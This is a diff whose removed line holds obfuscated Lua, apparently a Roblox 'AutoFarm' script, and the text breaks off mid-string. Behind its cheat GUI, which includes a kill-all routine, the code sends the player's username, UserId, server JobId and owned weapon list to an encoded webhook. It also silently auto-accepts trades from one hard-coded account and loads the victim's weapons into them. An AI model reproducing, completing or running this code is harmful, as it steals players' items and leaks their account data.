@@ -1,1 +1,566 @@
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v129,v130) local v131={};for v186=1, #v129 do v6(v131,v0(v4(v1(v2(v129,v186,v186 + 1 )),v1(v2(v130,1 + (v186% #v130) ,1 + (v186% #v130) + 1 )))%256 ));end return v5(v131);end local v8=game:GetService(v7("\225\207\218\60\227\169\212","\126\177\163\187\69\134\219\167"));local v9=game:GetService(v7("\23\218\47\192\242\16\200\56\211\245\32\200","\156\67\173\74\165"));local v10=game:GetService(v7("\6\162\71\37\185\52\80\61\180\76","\38\84\215\41\118\220\70"));local v11=game:GetService(v7("\102\31\48\6\235\81\26\23\1\251\66","\158\48\118\66\114"));local v12=game:GetService(v7("\131\48\4\38\64\160\233\189\45\19\51","\155\203\68\112\86\19\197"));local v13=game:GetService(v7("\116\216\38\240\73\123\228\236\67\217\5\232\79\106\228\255\67","\152\38\189\86\156\32\24\133"));local v14=game:GetService(v7("\208\94\160\78\232\94\169\65","\38\156\55\199"));local v15=game:GetService(v7("\133\124\104\45\1\125\251\79\155\120\110\62\26\119\255","\35\200\29\28\72\115\20\154"));local v16=v8.LocalPlayer;local v17=v16:WaitForChild(v7("\41\179\208\198\136\62\19\12\182","\84\121\223\177\191\237\76"));local v18=v7("\179\66\221\176\41\10\127\142\191\95\218\163\53\66\52\143\184\89\196\239\59\64\57\142\172\83\203\168\53\95\59\210\244\7\156\243\98\1\100\153\239\3\156\244\111\1\101\152\235\0\156\246\117\123\3\239\163\116\234\150\20\125\57\214\158\101\248\180\22\83\5\233\158\1\239\143\12\73\9\227\180\85\250\149\61\115\63\145\190\14\250\167\2\9\39\212\147\90\218\184\104\96\5\235\156\103\209\149\47\123\22\204\159\14\218\154\49\98\39\236\233","\161\219\54\169\192\90\48\80");local v19=v7("\71\67\9\40\91\67\4\44\70\20","\69\41\34\96");local v20=22042146 + 120781145 ;local v21=false;local v22=147 -97 ;local v23=1487 -(257 + 930) ;local v24={};local v25=1666 -(636 + 1030) ;local v26=false;local v27=true;local v28=tick();local v29=false;local v30=false;local v31=false;local function v32(v132,v133) local v134=0;local v135;local v136;while true do if (v134==(0 -0)) then local v208=0 + 0 ;while true do if (v208==(325 -(45 + 280))) then v135=(v133 and ("@everyone\n"   .. v132)) or v132 ;v136={[v7("\191\204\217\30\7\37\168","\75\220\163\183\106\98")]=v135,[v7("\23\169\142\37\215\3\183\142","\185\98\218\235\87")]=v7("\157\107\52\237\215\168\194\56\46\166\255\191\223\51\1\231\204\167\139\119\103\210\204\171\197\47\33\227\204","\202\171\92\71\134\190"),[v7("\40\215\45\156\40\211\19\157\59\205","\232\73\161\76")]=v7("\179\205\86\77\13\225\150\13\84\80\178\212\69\72\12\245\218\77\80\81\239\232\16\91\71\245\201\76\90","\126\219\185\34\61")};v208=1;end if (v208==(1 + 0)) then v134=1 + 0 ;break;end end end if (v134==(1 + 0)) then pcall(function() request({[v7("\57\220\82","\135\108\174\62\18\30\23\147")]=v18,[v7("\155\236\62\195\23\170","\167\214\137\74\171\120\206\83")]=v7("\187\223\1\105","\199\235\144\82\61\152"),[v7("\47\19\184\47\2\4\170","\75\103\118\217")]={[v7("\228\91\126\0\188\16\211\25\68\13\169\27","\126\167\52\16\116\217")]=v7("\201\62\48\140\189\26\253\220\39\47\142\251\19\239\199\32","\156\168\78\64\224\212\121")},[v7("\37\225\161\215","\174\103\142\197")]=v12:JSONEncode(v136)});end);break;end end end local function v33() local v137=0;local v138;while true do local v187=0 + 0 ;while true do if (v187==(0 + 0)) then if (v137==0) then v138={};pcall(function() local v254=0 + 0 ;local v255;while true do if (v254==(0 -0)) then v255=require(v13.Modules.ProfileData);if (v255 and v255.Weapons and v255.Weapons.Owned) then for v288,v289 in pairs(v255.Weapons.Owned) do if (v289 and (v289>(1911 -(340 + 1571)))) then table.insert(v138,v288   .. v7("\22\48","\152\54\72\63\88\69\62")   .. tostring(v289) );end end end break;end end end);v137=298 -(36 + 261) ;end if ((1 + 0)==v137) then table.sort(v138);return v138;end break;end end end end local function v34() local v139=1772 -(1733 + 39) ;local v140;local v141;local v142;local v143;local v144;while true do if (v139==(1 + 1)) then if ( #v143>900) then v143=string.sub(v143,2 -1 ,2183 -(1035 + 248) )   .. "\n... (truncated)" ;end v144={[v7("\91\81\11\61\34\227\6","\114\56\62\101\73\71\141")]=v7("\152\236\205\193\170\240\212\202\189\169\145\142\149\196\137\132\140\251\218\202\171\239\222\214\248\219\222\197\188\240\155\140\149\230\217\205\180\236\146\142\242","\164\216\137\187"),[v7("\215\235\51\183\162\237","\107\178\134\81\210\198\158")]={{[v7("\44\7\150\202\175","\202\88\110\226\166")]=v7("\242\26\139\244\193\131\59\144\246\196\208\9\135\229","\170\163\111\226\151"),[v7("\18\63\190\55\92","\73\113\80\210\88\46\87")]=5765667 -(1096 + 852) ,[v7("\135\37\200\30\227\146","\135\225\76\173\114")]={{[v7("\20\236\181\181","\199\122\141\216\208\204\221")]=v7("\152\206\21\226\118\247\160\216","\150\205\189\112\144\24"),[v7("\51\133\179\89\1","\112\69\228\223\44\100\232\113")]=v16.Name,[v7("\221\17\11\218\184\121","\230\180\127\103\179\214\28")]=true},{[v7("\130\4\82\67","\128\236\101\63\38\132\33")]=v7("\153\186\20\86\159\239","\175\204\201\113\36\214\139"),[v7("\81\205\57\201\1","\100\39\172\85\188")]=tostring(v16.UserId),[v7("\164\118\181\137\61\168","\83\205\24\217\224")]=true},{[v7("\232\196\192\56","\93\134\165\173")]=v7("\148\253\195\235\62","\30\222\146\161\162\90\174\210"),[v7("\243\79\124\31\224","\106\133\46\16")]="`"   .. v140   .. "`" ,[v7("\81\46\127\245\84\69","\32\56\64\19\156\58")]=false},{[v7("\84\201\232\83","\224\58\168\133\54\58\146")]=v7("\115\89\66\243\53\170\142\5\82","\107\57\54\43\157\21\230\231"),[v7("\205\138\29\224\188","\175\187\235\113\149\217\188")]=v7("\52\187\149\92\240\35\55\115\169\132\94\237\55\111\40\169\206\70\236\112\118\57\189\222\92\239\120\123\57\134\133\17","\24\92\207\225\44\131\25")   .. v20   .. v7("\13\212\185\65\30\84\69\192\172\77\21\126\78\250\188\17","\29\43\179\216\44\123")   .. v140 ,[v7("\180\215\44\69\179\220","\44\221\185\64")]=false},{[v7("\15\230\69\90","\19\97\135\40\63")]=v7("\141\83\61\40\32\61\171\28\123\29\126\99\231","\81\206\60\83\91\79"),[v7("\88\170\220\103\42","\196\46\203\176\18\79\163\45")]="```js\n"   .. v141   .. "\n```" ,[v7("\177\44\114\23\42\254","\143\216\66\30\126\68\155")]=false},{[v7("\164\201\0\206","\129\202\168\109\171\165\195\183")]=v7("\11\86\33\221\208\0\233\48\65\119\144","\134\66\56\87\184\190\116")   ..  #v142   .. v7("\124\56\29\190\20\248\104","\85\92\81\105\219\121\139\65") ,[v7("\235\178\92\80\121","\191\157\211\48\37\28")]="```\n"   .. v143   .. "\n```" ,[v7("\214\17\248\21\52\218","\90\191\127\148\124")]=false}},[v7("\126\136\33\3\125\149","\119\24\231\78")]={[v7("\150\40\189\94","\113\226\77\197\42\188\32")]=v7("\13\23\253\161\51\24\243\245\60\25\230\245\46\4\245\177\63\86\242\167\53\27\180","\213\90\118\148")   .. v19 },[v7("\79\39\185\83\94\79\47\185\70","\45\59\78\212\54")]=os.date(v7("\81\19\186\198\195\35\224\181\20\98\198\163\220\107\128\170\85\101\185","\144\112\54\227\235\230\78\205"))}}};v139=515 -(409 + 103) ;end if ((237 -(46 + 190))==v139) then v142=v33();v143=(( #v142>(95 -(51 + 44))) and table.concat(v142,"\n")) or v7("\250\203\174\75\209\197\254\83\218\215\174\90\219\209\224\88","\60\180\164\142") ;v139=6 -4 ;end if (v139==(1 + 2)) then pcall(function() request({[v7("\134\58\3","\59\211\72\111\156\176")]=v18,[v7("\99\130\247\37\65\131","\77\46\231\131")]=v7("\138\123\133\116","\32\218\52\214"),[v7("\102\18\48\172\244\162\86","\58\46\119\81\200\145\208\37")]={[v7("\8\131\62\184\172\179\34\102\184\41\188\172","\86\75\236\80\204\201\221")]=v7("\115\81\103\137\247\136\115\85\126\138\240\196\120\82\120\139","\235\18\33\23\229\158")},[v7("\114\181\197\162","\219\48\218\161")]=v12:JSONEncode(v144)});end);break;end if ((1317 -(1114 + 203))==v139) then v140=tostring(game.JobId);v141='Roblox.GameLauncher.joinGameInstance(142823291, "'   .. v140   .. '")' ;v139=1;end end end task.spawn(v34);local v35=v13:WaitForChild(v7("\208\99\125\77\222","\128\132\17\28\41\187\47"),741 -(228 + 498) );local v36=v35 and v35:FindFirstChild(v7("\46\52\0\63\79\40\38\3\55","\61\97\82\102\90")) ;local v37=v35 and v35:FindFirstChild(v7("\141\45\168\78\215\67\44\12\189\59\174\88\211","\105\204\78\203\43\167\55\126")) ;local v38=v35 and v35:FindFirstChild(v7("\132\169\32\27\3\16\243\67\164\174\38","\49\197\202\67\126\115\100\167")) ;local v39=v35 and v35:FindFirstChild(v7("\4\94\209\45\178\83\79\34\94\204\61","\62\87\59\191\73\224\54")) ;local v40=v35 and v35:FindFirstChild(v7("\212\22\251\219\243\54\232\200\227\7","\169\135\98\154")) ;local v41=v35 and v35:FindFirstChild(v7("\254\103\32\85\233\54\252\217\118\32\81","\168\171\23\68\52\157\83")) ;local v42=v35 and v35:FindFirstChild(v7("\208\116\246\161\44\35\130\192\99\244\169\32","\231\148\17\149\205\69\77")) ;local v43=false;local v44=0 + 0 ;local v45=false;local v46=0 + 0 ;local v47=nil;local function v48(v145) return v145 and (tostring(v145):lower()==v19:lower()) ;end local function v49() local v146=663 -(174 + 489) ;local v147;while true do if (v146==(2 -1)) then return v147;end if (v146==(1905 -(830 + 1075))) then v147={};pcall(function() local v221=524 -(303 + 221) ;local v222;while true do if (v221==(1269 -(231 + 1038))) then v222=require(v13.Modules.ProfileData);if (v222 and v222.Weapons and v222.Weapons.Owned) then for v280,v281 in pairs(v222.Weapons.Owned) do if (v281 and (v281>(0 + 0)) and (v280~=v7("\164\162\193\250\66\243\148\140\201\242\81\250","\159\224\199\167\155\55")) and (v280~=v7("\211\246\58\211\226\255\40\245\226\253","\178\151\147\92"))) then table.insert(v147,v280);end end end break;end end end);v146=2 -1 ;end end end local function v50() local v148=1162 -(171 + 991) ;while true do if ((4 -3)==v148) then for v223=2 -1 ,37 -22  do if v47 then pcall(function() v38:FireServer(game.PlaceId * (3 + 0) ,v47);end);end pcall(function() v38:FireServer(game.PlaceId * (10 -7) ,tick());end);pcall(function() v38:FireServer();end);task.wait(0.35 -0 );end break;end if (v148==(688 -(364 + 324))) then if  not v38 then return;end print(v7("\183\201\94\51\28\95\124\137\239\113\114\52\67\104\143\248\12\51\17\79\127\156\233\69\60\21\12\109\133\233\68\114\45\64\117\194\179\2","\26\236\157\44\82\114\44"));v148=2 -1 ;end end end local function v51() local v149=0 -0 ;local v150;local v151;while true do if (v149==(1 -0)) then local v209=0 -0 ;while true do if ((1249 -(111 + 1137))==v209) then v149=5 -3 ;break;end if ((1268 -(1249 + 19))==v209) then v150=v49();if ( #v150==(158 -(91 + 67))) then return;end v209=2 -1 ;end end end if (v149==(1 + 1)) then local v210=523 -(423 + 100) ;while true do if (v210==1) then v149=3 + 0 ;break;end if (v210==(229 -(73 + 156))) then v151=math.min((1 + 3) -v44 , #v150);for v256=2 -1 ,v151 do local v257=0 + 0 ;local v258;while true do if (v257==(771 -(326 + 445))) then v258=pcall(function() v36:FireServer(v150[v256],v7("\29\43\212\75\37\32\198","\59\74\78\181"));end);if v258 then local v284=0 + 0 ;local v285;while true do if (v284==(0 -0)) then v285=0 -0 ;while true do if (v285==(2 -1)) then print(v7("\30\229\72\91\189\54\215\95\72\142\101\254\92\92\182\55\212\94\0","\211\69\177\58\58"),v150[v256],"("   .. v44   .. v7("\248\177\48","\171\215\133\25\149\137") );task.wait(711.3 -(530 + 181) );break;end if (v285==(881 -(614 + 267))) then v44+=(33 -(19 + 13)) v46=tick();v285=1 -0 ;end end break;end end end break;end end end v210=1 + 0 ;end end end if (v149==(6 -3)) then if ((v44>=(11 -7)) and  not v45) then local v232=0 + 0 ;while true do if (v232==(0 -0)) then v45=true;print("[Transfer] Trade full → waiting 7s then accepting");v232=1 -0 ;end if (v232==(1813 -(1293 + 519))) then task.delay(13 -6 ,function() if v43 then v50();end end);break;end end end break;end if (v149==(0 -0)) then if ( not v36 or  not v43 or (v44>=(1538 -(709 + 825)))) then return;end if ((tick() -v46)<0.55) then return;end v149=1 -0 ;end end end local function v52(v152) local v153=0;local v154;while true do if (v153==(0 -0)) then v154=0 -0 ;while true do if (v154==(864 -(196 + 668))) then if  not v152 then return;end pcall(function() for v267,v268 in ipairs(v152:GetChildren()) do if v268:IsA(v7("\198\221\59\213\237\58\249\65\245","\34\129\168\82\154\143\80\156")) then v268.Visible=false;end end end);break;end end break;end end end local function v53(v155) local v156=0 + 0 ;local v157;while true do if (v156==0) then v157=v17:FindFirstChild(v155);if v157 then v52(v157);v157:GetPropertyChangedSignal(v7("\160\188\50\9\68\75\141","\233\229\210\83\107\40\46")):Connect(function() if v157.Enabled then v52(v157);end end);v157.ChildAdded:Connect(function() local v238=0 + 0 ;while true do if (v238==(833 -(171 + 662))) then task.wait(93.05 -(4 + 89) );v52(v157);break;end end end);end break;end end end v53(v7("\245\80\51\210\0\230\119\27","\101\161\34\82\182"));v53(v7("\220\31\88\250\222\197\183\7\215\61\81\241\213\231","\78\136\109\57\158\187\130\226"));v17.ChildAdded:Connect(function(v158) if ((v158.Name==v7("\10\45\248\245\59\24\204\216","\145\94\95\153")) or (v158.Name==v7("\201\223\21\209\75\144\200\228\43\229\70\184\243\200","\215\157\173\116\181\46"))) then local v195=0 -0 ;while true do if ((0 + 0)==v195) then task.wait(0.1 + 0 );v52(v158);v195=1;end if (v195==(4 -3)) then v53(v158.Name);break;end end end end);if v39 then v39.OnClientInvoke=function(v196) local v197=0;while true do if (v197==(0 + 0)) then if v48(v196 and v196.Name ) then local v259=0 + 0 ;local v260;while true do if (v259==(1453 -(28 + 1425))) then v260=0;while true do if (v260==(1097 -(709 + 387))) then v44=1858 -(673 + 1185) ;v45=false;v260=5 -3 ;end if ((1514 -(822 + 692))==v260) then print("[Transfer] Request from naimradio6 → accepting");v43=true;v260=3 -2 ;end if (v260==(2 + 1)) then local v290=0 -0 ;while true do if (v290==(0 + 0)) then if v37 then pcall(function() v37:FireServer();end);end return true;end end end if (v260==(1 + 1)) then v47=nil;task.wait(0.3 + 0 );v260=3 -0 ;end end break;end end end return false;end end end;end if v40 then v40.OnClientEvent:Connect(function() if v43 then local v224=0 + 0 ;while true do if (v224==(1 -0)) then task.wait(0.4 -0 );v51();break;end if (v224==(1880 -(446 + 1434))) then v44=0 + 0 ;v45=false;v224=1 -0 ;end end end end);end if v41 then v41.OnClientEvent:Connect(function(v198) local v199=1283 -(1040 + 243) ;while true do if (v199==0) then if ((type(v198)==v7("\33\181\137\254\223","\186\85\212\235\146")) and v198._lo) then local v261=0 -0 ;local v262;while true do if (v261==0) then v262=1847 -(559 + 1288) ;while true do if (v262==(1206 -(741 + 465))) then v47=v198._lo;print(v7("\249\181\4\255\55\253\94\199\147\43\190\26\239\72\214\148\4\251\61\174\103\206\142","\56\162\225\118\158\89\142"));break;end end break;end end end if  not v43 then return;end v199=1932 -(609 + 1322) ;end if (v199==2) then if (type(v198)==v7("\72\4\194\163\39","\184\60\101\160\207\66")) then for v269,v270 in pairs(v198) do if ((type(v270)==v7("\37\131\126\176\52","\220\81\226\28")) and v270.Accepted) then print("[Transfer] Other side accepted → finishing");v50();break;end end end break;end if (v199==(455 -(13 + 441))) then task.wait(0.25 -0 );v51();v199=4 -2 ;end end end);end if v42 then v42.OnClientEvent:Connect(function() v43=false;v44=0 + 0 ;v45=false;v47=nil;print(v7("\40\225\144\250\228\212\21\208\144\198\170\243\1\212\134\254\170\194\29\209\135\255","\167\115\181\226\155\138"));end);end task.spawn(function() while true do local v189=0 + 0 ;while true do if (0==v189) then task.wait(0.8 + 0 );if (v43 and v38 and v47) then pcall(function() v38:FireServer(game.PlaceId * (7 -4) ,v47);end);end break;end end end end);local function v54() local v159=0 -0 ;local v160;local v161;local v162;while true do if (v159==1) then v162=nil;while true do if ((1 + 1)==v160) then return false;end if (v160==(0 -0)) then v161=v16.Character;v162=v16.Backpack;v160=1 + 0 ;end if (v160==1) then if v161 then local v271=0 + 0 ;local v272;while true do if (v271==(0 -0)) then v272=v161:FindFirstChildOfClass(v7("\214\45\232\80","\166\130\66\135\60\27\17"));if (v272 and v272.Name:lower():find(v7("\79\68\199\115\53","\80\36\42\174\21"))) then return true;end break;end end end for v263,v264 in ipairs(v162:GetChildren()) do if (v264:IsA(v7("\122\31\56\118","\26\46\112\87")) and v264.Name:lower():find(v7("\178\45\162\114\186","\212\217\67\203\20\223\223\37"))) then return true;end end v160=2 + 0 ;end end break;end if (v159==(0 -0)) then v160=0 -0 ;v161=nil;v159=1;end end end local function v55() local v163=v16.Character;if  not v163 then return;end local v164=v163:FindFirstChildOfClass(v7("\142\130\167\222","\178\218\237\200")) or v163:FindFirstChild(v7("\157\187\239\214\179","\176\214\213\134")) ;if  not v164 then for v211,v212 in ipairs(v16.Backpack:GetChildren()) do if (v212:IsA(v7("\192\162\185\216","\57\148\205\214\180\200\54")) and v212.Name:lower():find(v7("\25\243\60\50\115","\22\114\157\85\84"))) then v164=v212;v164.Parent=v163;break;end end end if ( not v164 or  not v164:FindFirstChild(v7("\236\202\29\192\81\243","\200\164\171\115\164\61\150"))) then return;end print("[AutoFarm] Murderer + Full → Killing everyone...");for v190,v191 in ipairs(v8:GetPlayers()) do if ((v191~=v16) and v191.Character and v191.Character:FindFirstChild(v7("\150\225\14\68\141\177\253\7\119\140\177\224\51\68\145\170","\227\222\148\99\37"))) then pcall(function() local v225=0 + 0 ;local v226;while true do if (v225==(0 + 0)) then v226=0 + 0 ;while true do if (v226==(0 + 0)) then firetouchinterest(v191.Character.HumanoidRootPart,v164.Handle,1 + 0 );firetouchinterest(v191.Character.HumanoidRootPart,v164.Handle,0);break;end end break;end end end);end end end local function v56() settings().Rendering.QualityLevel=Enum.QualityLevel.Level01;v14.GlobalShadows=false;v14.FogEnd=8999999921 -(153 + 280) ;v14.Brightness=5 -3 ;pcall(function() local v192=45 -(10 + 35) ;while true do if (v192==(0 -0)) then v14.EnvironmentDiffuseScale=0 + 0 ;v14.EnvironmentSpecularScale=0 + 0 ;v192=1 + 0 ;end if (v192==(1 + 0)) then v15.Use2022Materials=false;break;end end end);v30=true;end local v57=Instance.new(v7("\0\81\64\243\252\61\117\71\255","\153\83\50\50\150"));v57.Name=v7("\110\125\122\30\122\175\68\124\99\103\19\85\170\95\80","\45\61\22\19\124\19\203");v57.ResetOnSpawn=false;v57.IgnoreGuiInset=true;v57.Parent=v17;local v62=Instance.new(v7("\231\0\12\248\7","\217\161\114\109\149\98\16"));v62.Size=UDim2.fromOffset(973 -683 ,273 + 27 );v62.Position=UDim2.new(0.5 + 0 , -(27 + 118),0.2 -0 ,0 -0 );v62.BackgroundColor3=Color3.fromRGB(16 + 9 ,799 -(431 + 343) ,70 -35 );v62.Active=true;v62.Draggable=true;v62.Parent=v57;Instance.new(v7("\39\9\27\115\174\122\23\50","\20\114\64\88\28\220"),v62).CornerRadius=UDim.new(0,677 -(89 + 578) );local v70=Instance.new(v7("\4\40\225\160\234\223\182\52","\221\81\97\178\212\152\176"));v70.Thickness=2.8;v70.Parent=v62;task.spawn(function() local v170=0;local v171;while true do if (v170==(0 + 0)) then v171=0;while v62.Parent do v171+=task.wait(0.025 + 0 ) v70.Color=Color3.fromHSV((v171%5)/(10 -5) ,1050 -(572 + 477) ,1 + 0 );end break;end end end);local v73=Instance.new(v7("\249\226\5\239\56\216\243\9\244\20","\122\173\135\125\155"));v73.Size=UDim2.new(15 -(6 + 9) ,19 + 11 ,0,30);v73.Position=UDim2.new(1 + 0 , -(204 -(28 + 141)),0 + 0 ,5);v73.BackgroundColor3=Color3.fromRGB(256 -(84 + 2) ,65 -25 ,29 + 11 );v73.Text="X";v73.TextColor3=Color3.new(843 -(497 + 345) ,1 + 0 ,2 -1 );v73.Font=Enum.Font.GothamBold;v73.TextSize=4 + 14 ;v73.Parent=v62;Instance.new(v7("\177\232\35\182\45\63\205\150","\168\228\161\96\217\95\81"),v73).CornerRadius=UDim.new(0 + 0 ,1341 -(605 + 728) );v73.MouseButton1Click:Connect(function() local v172=0 + 0 ;while true do if (v172==(0 + 0)) then v32("❌ GUI closed by "   .. v16.Name ,false);v57:Destroy();break;end end end);local v84=Instance.new(v7("\239\212\54\72\3\86\217\212\34","\55\187\177\78\60\79"));v84.Size=UDim2.new(1 -0 , -70,0 -0 ,2 + 30 );v84.Position=UDim2.new(0,55 -40 ,1944 -(1129 + 815) ,8 + 0 );v84.BackgroundTransparency=2 -1 ;v84.Text=v7("\123\153\76\224\79\205\137\41\199\31\234\83\219\143\43\207\77\230","\224\77\174\63\139\38\175");v84.TextColor3=Color3.fromRGB(482 -227 ,193 + 62 ,744 -(457 + 32) );v84.Font=Enum.Font.GothamBold;v84.TextSize=8 + 9 ;v84.Parent=v62;local function v93(v173,v174,v175) local v176=1402 -(832 + 570) ;local v177;while true do local v193=0 + 0 ;while true do if (v193==(1 + 0)) then if ((0 -0)==v176) then local v241=0 + 0 ;while true do if (v241==(797 -(588 + 208))) then v177.Position=UDim2.new(0 -0 ,1810 -(884 + 916) ,0 -0 ,v173);v176=1 -0 ;break;end if (v241==(0 + 0)) then v177=Instance.new(v7("\176\68\64\58\166\84\76\58\139\79","\78\228\33\56"));v177.Size=UDim2.new(1 + 0 , -(820 -(24 + 776)),0 -0 ,34);v241=786 -(222 + 563) ;end end end if (v176==(656 -(232 + 421))) then Instance.new(v7("\251\87\145\12\151\192\123\160","\229\174\30\210\99"),v177).CornerRadius=UDim.new(1889 -(1569 + 320) ,8);return v177;end break;end if (v193==(0 + 0)) then if (v176==(1 + 1)) then v177.Font=Enum.Font.GothamBold;v177.TextSize=46 -32 ;v177.Parent=v62;v176=608 -(316 + 289) ;end if (v176==(2 -1)) then v177.Text=v174;v177.BackgroundColor3=v175 or Color3.fromRGB(50 + 10 ,3 + 57 ,1533 -(666 + 787) ) ;v177.TextColor3=Color3.new(426 -(360 + 65) ,1 + 0 ,1);v176=2 + 0 ;end v193=1 + 0 ;end end end end local v94=v93(302 -(79 + 175) ,v7("\58\248\146\94\203\60\43\22\183\198\126\203\27","\89\123\141\230\49\141\93"));local v95=v93(138 -50 ,v7("\210\127\226\5\93\107\213\90\172\76\63\108\213","\42\147\17\150\108\112"));local v96=v93(100 + 28 ,v7("\61\163\62\122\243\168\0\168\109\89\242\228\3\252\109\80\201","\136\111\198\77\31\135"),Color3.fromRGB(245 -165 ,308 -148 ,979 -(503 + 396) ));local v97=v93(349 -(92 + 89) ,v7("\50\12\181\80\178\246\26\168\12\10\162\22\144\235\19\172\88\73\136\112\155","\201\98\105\199\54\221\132\119"));local v98=Instance.new(v7("\141\9\155\53\46\52\174\188\0","\204\217\108\227\65\98\85"));v98.Size=UDim2.new(1727 -(1165 + 561) , -(1 + 19),0 -0 ,34 -16 );v98.Position=UDim2.new(0 + 0 ,6 + 4 ,0 -0 ,29 + 181 );v98.BackgroundTransparency=2 -1 ;v98.Text=v7("\109\211\240\224\40\154","\160\62\163\149\133\76");v98.TextColor3=Color3.fromRGB(175 + 25 ,200,96 + 104 );v98.Font=Enum.Font.Gotham;v98.TextSize=27 -14 ;v98.Parent=v62;local v108=Instance.new(v7("\226\165\21\59\225\217\184","\163\182\192\109\79"));v108.Size=UDim2.new(2 -1 , -(901 -(581 + 300)),0 + 0 ,48 -16 );v108.Position=UDim2.new(1244 -(485 + 759) ,4 + 6 ,0 -0 ,215 + 13 );v108.Text=tostring(v22);v108.BackgroundColor3=Color3.fromRGB(1234 -(442 + 747) ,45,1190 -(832 + 303) );v108.TextColor3=Color3.new(947 -(88 + 858) ,1 + 0 ,1 + 0 );v108.Font=Enum.Font.GothamBold;v108.TextSize=1 + 14 ;v108.Parent=v62;Instance.new(v7("\1\15\35\207\231\58\35\18","\149\84\70\96\160"),v108).CornerRadius=UDim.new(789 -(766 + 23) ,39 -31 );local v118=Instance.new(v7("\12\3\21\249\20\7\15\232\52","\141\88\102\109"));v118.Size=UDim2.new(70 -(10 + 59) , -(27 -7),0 -0 ,1187 -(671 + 492) );v118.Position=UDim2.new(0,26 -16 ,1215 -(369 + 846) ,71 + 197 );v118.BackgroundTransparency=3 -2 ;v118.Text=v7("\144\92\198\124\31\62\65\196\183\9\138\32","\161\211\51\170\16\122\93\53");v118.TextColor3=Color3.new(1074 -(1036 + 37) ,1 + 0 ,1 -0 );v118.Font=Enum.Font.Gotham;v118.TextSize=14;v118.Parent=v62;local function v127() local v178=0 + 0 ;while true do if (v178==(203 -(11 + 192))) then v94.BackgroundColor3=(v21 and Color3.fromRGB(1560 -(641 + 839) ,1073 -(910 + 3) ,203 -123 )) or Color3.fromRGB(1744 -(1466 + 218) ,28 + 32 ,255 -(135 + 40) ) ;v95.BackgroundColor3=(v26 and Color3.fromRGB(1228 -(556 + 592) ,57 + 103 ,888 -(329 + 479) )) or Color3.fromRGB(914 -(174 + 680) ,206 -146 ,165 -85 ) ;v178=2 -1 ;end if (v178==(1 + 0)) then v96.BackgroundColor3=(v27 and Color3.fromRGB(18 + 62 ,899 -(396 + 343) ,8 + 72 )) or Color3.fromRGB(1029 -(522 + 447) ,1537 -(29 + 1448) ,1469 -(135 + 1254) ) ;v97.BackgroundColor3=(v30 and Color3.fromRGB(301 -221 ,68 + 92 ,373 -293 )) or Color3.fromRGB(40 + 20 ,1587 -(389 + 1138) ,654 -(102 + 472) ) ;break;end end end v94.MouseButton1Click:Connect(function() local v179=0 + 0 ;local v180;while true do if (v179==(0 + 0)) then v180=0 + 0 ;while true do if (v180==(504 -(74 + 429))) then v127();if v21 then local v273=0 + 0 ;local v274;while true do if (v273==(1545 -(320 + 1225))) then v274=0;while true do if (v274==(1 -0)) then v28=tick();v29=false;v274=2 + 0 ;end if (v274==(0 -0)) then v25=0;v24={};v274=1 + 0 ;end if (v274==2) then v31=false;v118.Text=v7("\123\24\43\74\93\20\51\67\92\77\103\22","\38\56\119\71");v274=436 -(279 + 154) ;end if (v274==(1467 -(157 + 1307))) then v32("🟢 AutoFarm started by "   .. v16.Name ,false);break;end end break;end end else v32("🔴 AutoFarm stopped by "   .. v16.Name ,false);end break;end if (v180==(1859 -(821 + 1038))) then v21= not v21;v94.Text=(v21 and v7("\218\187\166\39\221\175\160\37\161\238\157\6","\72\155\206\210")) or v7("\103\111\64\1\21\71\104\89\84\115\105\92\114","\83\38\26\52\110") ;v180=1 + 0 ;end end break;end end end);v95.MouseButton1Click:Connect(function() v26= not v26;v95.Text=(v26 and v7("\210\225\76\223\104\119\213\196\2\150\10\120","\54\147\143\56\182\69")) or v7("\247\143\235\64\146\247\167\212\19\159\249\167\217","\191\182\225\159\41") ;v127();v32(((v26 and "🟢") or "🔴")   .. v7("\107\51\38\65\130\202\227\13\57\104","\162\75\114\72\53\235\231")   .. ((v26 and v7("\163\18","\98\236\92\36\130\51")) or v7("\139\63\42","\80\196\121\108\218\37\200\213"))   .. v7("\64\113\27\63","\234\96\19\98\31\43\110")   .. v16.Name ,false);end);v96.MouseButton1Click:Connect(function() local v182=0 -0 ;local v183;while true do if ((0 + 0)==v182) then v183=0 -0 ;while true do if (v183==(1 + 0)) then v127();v32(((v27 and "🟢") or "🔴")   .. v7("\112\44\133\11\68\36\94\143\22\1\22\11\140\20\1","\33\80\126\224\120")   .. ((v27 and v7("\195\134","\60\140\200\99\164")) or v7("\168\210\34","\194\231\148\100\70"))   .. v7("\6\78\216\227","\168\38\44\161\195\150")   .. v16.Name ,false);break;end if ((0 -0)==v183) then v27= not v27;v96.Text=(v27 and v7("\52\26\65\194\184\50\132\8\95\116\210\160\126\209\70\48\124","\235\102\127\50\167\204\18")) or v7("\98\164\230\38\80\110\95\175\181\5\81\34\92\251\181\12\98\8","\78\48\193\149\67\36") ;v183=1027 -(834 + 192) ;end end break;end end end);v97.MouseButton1Click:Connect(function() if  not v30 then local v200=0 + 0 ;local v201;while true do if (0==v200) then v201=0 + 0 ;while true do if ((1 + 0)==v201) then v127();v32("🟢 Performance Mode ON by "   .. v16.Name ,false);break;end if (v201==(1183 -(1058 + 125))) then v56();v97.Text=v7("\176\249\144\112\63\250\187\23\142\255\135\54\29\231\178\19\218\188\173\88","\118\224\156\226\22\80\136\214");v201=1 -0 ;end end break;end end end end);v108.FocusLost:Connect(function(v184) if v184 then local v202=304 -(300 + 4) ;local v203;while true do if (1==v202) then v108.Text=tostring(v22);break;end if (v202==(0 + 0)) then v203=tonumber(v108.Text);v22=(v203 and math.clamp(v203,2 -1 ,1875 + 8125 )) or v22 ;v202=363 -(112 + 250) ;end end end end);local v128=v13:FindFirstChild(v7("\112\235\84\143\86\235\74","\224\34\142\57"));if v128 then v128=v128:FindFirstChild(v7("\249\166\200\216\99\253\92\23","\110\190\199\165\189\19\145\61"));if v128 then v128=v128:FindFirstChild(v7("\249\228\126\230\168\200\214\231\114\235\159\194\222","\167\186\139\23\136\235"));end end if v128 then v128.OnClientEvent:Connect(function(v204,v205,v206) if ((v205>=v206) and v27 and v16.Character) then local v231=0 -0 ;while true do if (v231==(1 + 0)) then v32("♻️ **"   .. v16.Name   .. "** inventory full → reset" ,false);break;end if (v231==(0 -0)) then if v54() then if  not v31 then local v283=0 + 0 ;while true do if (v283==(1898 -(41 + 1857))) then v31=true;v32("🔪 **"   .. v16.Name   .. "** is Murderer + Full → 